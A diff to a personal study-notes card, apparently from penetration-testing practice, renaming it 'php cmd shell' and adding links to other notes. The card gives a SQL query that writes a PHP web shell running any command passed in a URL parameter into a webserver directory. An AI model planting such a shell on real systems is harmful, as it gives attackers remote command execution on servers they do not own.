@@ -1,4 +1,7 @@
-# linux
+# php cmd shell
+
+- this card is messed up. its name was "linux" and lots of things are linked to it assuming it was a linux hub at the time.
+
 Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)
 ```
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
@@ -30,6 +33,8 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
 - [20221008061845](/zet/20221008061845/README.md) workflow
 - [20221007200304](/zet/20221007200304/README.md) how to use zc cmd
 - [20221006214348](/zet/20221006214348/README.md) ippsec
+- [20221013035124](/zet/20221013035124/README.md) problems with markdown conversion process
+- [20221008042814](/zet/20221008042814/README.md) WIP
 
 Tags:
 
